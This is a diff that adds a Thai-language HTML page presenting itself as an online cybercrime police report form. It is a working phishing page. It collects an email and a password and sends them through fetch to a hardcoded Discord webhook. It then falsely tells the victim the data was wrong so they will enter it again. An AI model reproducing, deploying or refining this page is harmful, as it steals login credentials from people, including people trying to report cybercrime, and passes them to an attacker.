@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <title>แจ้งความไซเบอร์ออนไลน์</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            max-width: 500px;
+            margin: 40px auto;
+            background-image: url('https://medias.thansettakij.com/uploads/images/md/2023/04/Z9iBljN3SCjvKdiKoE1g.webp');
+            background-size: 100% 350%;
+            background-position: top;
+            background-repeat: no-repeat;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+        button {
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
+        }
+        #status {
+            margin-top: 10px;
+        }
+        h2 {
+    color: rgb(255, 255, 255);
+}
+
+    </style>
+</head>
+<body>
+<h2>กรุณาสร้างรหัส</h2>
+
+<input id="name" type="text" placeholder="Email">
+<textarea id="msg" placeholder="Password"></textarea>
+
+<button onclick="sendMessage()">ส่ง</button>
+
+<p id="status"></p>
+
+<script>
+    function sendMessage() {
+        const webhookURL = "https://discord.com/api/webhooks/1446547494807928854/LPkyqHJs-SlVKe8CuBW8o4tZn4mviKPaTaDE2-toz-IxLk9yr7Kao7P3D-jQfOKrBptI";  // <--- เปลี่ยนตรงนี้
+        const name = document.getElementById("name").value.trim();
+        const msg = document.getElementById("msg").value.trim();
+
+        if (!name || !msg) {
+            document.getElementById("status").innerText = "กรุณากรอกข้อมูลให้ครบ";
+            return;
+        }
+
+        const content = `📩 มีข้อความใหม่!\n**ชื่อผู้ส่ง:** ${name}\n**ข้อความ:** ${msg}`;
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content })
+        })
+        .then(res => {
+            if (res.ok) {
+                document.getElementById("status").innerText = "ข้อมูลผิดพลาดกรุณากรอกใหม่";
+                document.getElementById("name").value = "";
+                document.getElementById("msg").value = "";
+            } else {
+                document.getElementById("status").innerText = "Error กรุณาส่งใหม่";
+            }
+        })
+        .catch(() => {
+            document.getElementById("status").innerText = "เกิดข้อผิดพลาดในการเชื่อมต่อ";
+        });
+    }
+</script>
+
+</body>
+</html>
